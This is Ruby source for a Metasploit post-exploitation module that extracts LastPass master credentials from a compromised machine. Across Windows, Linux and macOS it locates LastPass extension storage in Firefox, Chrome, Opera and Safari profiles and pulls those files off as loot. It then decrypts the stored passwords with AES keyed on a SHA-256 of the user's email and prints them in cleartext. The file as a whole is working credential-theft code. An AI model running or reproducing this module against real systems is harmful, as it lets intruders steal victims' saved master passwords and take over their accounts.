require 'msf/core'
require 'base64'
require 'sqlite3'
require 'uri'

class Metasploit3 < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::UserProfiles
  include Msf::Post::OSX::System
  include Msf::Post::Unix

  def initialize(info = {})
    super(update_info(info,
    'Name' => 'LastPass Master Password Extractor',
    'Description' => %q{This module extracts and decrypts login accounts and passwords stored by Lastpass.},
    'License' => MSF_LICENSE,
    'Author' => ['Alberto Garcia Illera <agarciaillera[at]gmail.com>', 'Martin Vigo <martinvigo[at]gmail.com>'],
    'Platform' => %w{ linux osx unix win },
    'SessionTypes' => [ 'meterpreter, shell' ]
    ))
  end

  def run
    if session.platform =~ /win/ && session.type == "shell" # No Windows shell support
      print_error "Shell sessions on Windows are not supported"
      return
    end

    print_status "Searching for LastPass databases..."

    db_paths = database_paths # Find databases and get the remote paths
    if db_paths.size == 0 # Found any database?
      print_status "No databases found"
      return
    end

    print_status "Looking for credentials in all databases found..."

    credentials = [] # All credentials to be decrypted
    db_paths.each do |db_path|
      if db_path =~ /Mozilla/i # Firefox
        # Read and store the remote preferences file locally
        data = read_file(db_path)
        loot_path = store_loot('firefox.preferences', 'text/javascript', session, data, nil, "Firefox preferences file #{db_path}")

        # Extract usernames and passwords from preference file
        firefox_encoded_creds = firefox_credentials(loot_path)
        next unless firefox_encoded_creds
        firefox_encoded_creds.each do |creds|
          credentials.push([URI.unescape(creds[0]), URI.unescape(creds[1])]) unless creds[0].nil? || creds[1].nil?
        end

      else # Chrome, Safari and Opera
        # Read and store the remote database locally
        data = read_file(db_path)
        loot_path = store_loot('lastpass.database', 'application/x-sqlite3', session, data, nil, "LastPass database #{db_path}")

        # Parsing/Querying the DB
        db = SQLite3::Database.new(loot_path)
        credentials = db.execute("SELECT username, password FROM LastPassSavedLogins2 WHERE username IS NOT NULL AND username != '' AND password IS NOT NULL AND password != '';")
      end

      # Parse and decrypt credentials
      credentials.each do |row| # Decrypt passwords
        print_status "Decrypting password for user #{row[0]}..."
        password = clear_text_password(row[0], row[1])
        print_good("Username: '#{row[0]}' => Password: '#{password}' (Discard outer single quotes)") unless password.blank?
        print_line ""
      end
    end
  end

  # Finds the databases in the victim's machine
  def database_paths
    platform = session.platform
    existing_profiles = user_profiles
    found_dbs_paths = []

    case platform
    when /win/
      os = session.sys.config.sysinfo['OS']

      existing_profiles.each do |user_profile|
        print_status "Found user: #{user_profile['UserName']}"

        # Check Firefox
        path = "#{user_profile['AppData']}\\Mozilla\\Firefox\\Profiles"
        found_dbs_paths.push(find_db_paths(path, "Firefox"))

        # Check Chrome
        path = "#{user_profile['LocalAppData']}\\Google\\Chrome\\User Data\\Default\\databases\\chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0"
        found_dbs_paths.push(find_db_paths(path, "Chrome"))

        # Check Opera
        path = "#{user_profile['AppData']}\\Opera Software\\Opera Stable\\databases\\chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0"
        found_dbs_paths.push(find_db_paths(path, "Opera"))

        # Check Safari
        path = "#{user_profile['LocalAppData']}\\Apple Computer\\Safari\\Databases\\safari-extension_com.lastpass.lpsafariextension-n24rep3bmn_0"
        found_dbs_paths.push(find_db_paths(path, "Safari"))

        print_line ""
      end

    when /unix|linux/
      existing_profiles.each do |user_profile|
        print_status "Found user: #{user_profile['UserName']}"

        # Check Firefox
        path = "#{user_profile['LocalAppData']}/.mozilla/firefox"
        found_dbs_paths.push(find_db_paths(path, "Firefox"))

        # Check Chrome
        path = "#{user_profile['LocalAppData']}/.config/google-chrome/Default/databases/chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0"
        found_dbs_paths.push(find_db_paths(path, "Chrome"))
      end

    when /osx/
      existing_profiles.each do |user_profile|
        print_status "Found user: #{user_profile['UserName']}"

        # Check Firefox
        path = "#{user_profile['LocalAppData']}\\Firefox\\Profiles"
        found_dbs_paths.push(find_db_paths(path, "Firefox"))

        # Check Chrome
        path = "#{user_profile['LocalAppData']}/Google/Chrome/Default/databases/chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0"
        found_dbs_paths.push(find_db_paths(path, "Chrome"))

        # Check Safari
        path = "#{user_profile['AppData']}/Safari/Databases/safari-extension_com.lastpass.lpsafariextension-n24rep3bmn_0"
        found_dbs_paths.push(find_db_paths(path, "Safari"))

        # Check Opera
        path = "#{user_profile['LocalAppData']}/com.operasoftware.Opera/databases/chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0"
        found_dbs_paths.push(find_db_paths(path, "Opera"))
      end

    else
      print_error "platform not recognized: #{platform}"
      return nil
    end

    found_dbs_paths.flatten
  end

  # Returns a list of DB paths found in the victims' machine
  def find_db_paths(path, browser)
    found_dbs_paths = []

    print_status "Checking in #{browser}..."
    if browser == "Firefox" # Special case for Firefox
      profiles = profile_paths(path, browser)
      if profiles
        print_good "Found #{profiles.size} profile files in Firefox"
        profiles.each do |profile_path|
          file_paths = ["#{profile_path}\\prefs.js"]
          found_dbs_paths.push(file_paths)
        end
      end    
    else
      file_paths = file_paths(path, browser)
      found_dbs_paths.push(file_paths) unless file_paths.nil?
    end

    found_dbs_paths
  end



  # Returns the relevant information from user profiles
  def user_profiles
    case session.platform
    when /unix|linux/
      user_profiles = []
      if session.type == "meterpreter"
        user_names = client.fs.dir.entries("/home")
      else
        user_names = session.shell_command("ls /home").split
      end
      user_names.each do |user_name|
        user_profiles.push('UserName' => user_name, "LocalAppData" => "/home/#{user_name}") if user_name != '.' &&  user_name != '..'
      end

      return user_profiles

    when /osx/
      user_profiles = []
      user_names = session.shell_command("ls /Users").split
      user_names.each do |user_name|
        user_profiles.push('UserName' => user_name, "AppData" => "/Users/#{user_name}/Library", "LocalAppData" => "/Users/#{user_name}/Library/Application Support") if user_name != 'Shared'
      end

      return user_profiles

    when /win/
      return grab_user_profiles
    else
      print_error "OS not recognized: #{os}"
      return nil
    end
  end

  # Extracts the databases paths from the given folder ignoring . and ..
  def file_paths(path, browser)
    found_dbs_paths = []

    if directory?(path)
      if session.type == "meterpreter"
        files = client.fs.dir.entries(path)
        files.each do |file_path|
          found_dbs_paths.push(File.join(path, file_path)) if file_path != '.' &&  file_path != '..'
        end

      elsif session.type == "shell"
        files = session.shell_command("ls \"#{path}\"").split
        files.each do |file_path|
          found_dbs_paths.push(File.join(path, file_path)) if file_path != 'Shared'
        end

      else
        print_error "Session type not recognized: #{session.type}"
        return nil
      end
    end

    if found_dbs_paths.size > 0
      print_good "Found #{found_dbs_paths.size} database/s in #{browser}"
      return found_dbs_paths
    else
      print_status "No databases found for #{browser}"
      return nil
    end
  end

  # Returns the profile path for Firefox
  def profile_paths(path, browser)
    found_dbs_paths = []

    if directory?(path)
      if session.type == "meterpreter"
        files = client.fs.dir.entries(path)
        files.each do |file_path|
          found_dbs_paths.push(File.join(path, file_path)) if file_path != '.' &&  file_path != '..' && file_path.match(/.*\.default/)
        end

      elsif session.type == "shell"
        files = session.shell_command("ls \"#{path}\"").split
        files.each do |file_path|
          found_dbs_paths.push(File.join(path, file_path)) if file_path.match(/.*\.default/)
        end

      else
        print_error "Session type not recognized: #{session.type}"
        return nil
      end
    end

    if found_dbs_paths.size > 0
      return found_dbs_paths
    else
      print_status "No profile paths found for #{browser}"
      return nil
    end
  end

  # Parses the Firefox preferences file and returns encoded credentials
  def firefox_credentials(loot_path)
    credentials = []
    password_line = nil
    File.readlines(loot_path).each do |line|
      password_line = line if line['extensions.lastpass.loginpws']
    end

    return nil unless password_line

    if password_line.match(/user_pref\("extensions.lastpass.loginpws", "(.*)"\);/)
      encoded_credentials = password_line.match(/user_pref\("extensions.lastpass.loginpws", "(.*)"\);/)[1]
    else
      return nil
    end

    creds_per_user = encoded_credentials.split("|")
    creds_per_user.each do |user_creds|
      credentials.push(user_creds.split("=")) if user_creds.split("=").size > 1 # Any valid credentials present?
    end

    credentials
  end

  # Decrypts the password
  def clear_text_password(email, encrypted_data)
    return if encrypted_data.blank?

    sha256_hex_email = OpenSSL::Digest::SHA256.hexdigest(email)
    sha256_binary_email = [sha256_hex_email].pack "H*" # Do hex2bin

    if encrypted_data.include?("|") # Apply CBC
      decipher = OpenSSL::Cipher.new("AES-256-CBC")
      decipher.decrypt
      decipher.key = sha256_binary_email # The key is the emails hashed to SHA256 and converted to binary
      decipher.iv = Base64.decode64(encrypted_data[1, 24]) # Discard ! and |
      encrypted_password = encrypted_data[26..-1]
      begin
        decipher_result = decipher.update(Base64.decode64(encrypted_password)) + decipher.final
      rescue
        print_error "Password could not be decrypted"
        return nil
      end

    else # Apply ECB
      decipher = OpenSSL::Cipher.new("AES-256-ECB")
      decipher.decrypt
      decipher.key = sha256_binary_email
      begin
        decipher_result = decipher.update(Base64.decode64(encrypted_data)) + decipher.final
      rescue
        print_error "Password could not be decrypted"
        return nil
      end
    end

    decipher_result
  end
end
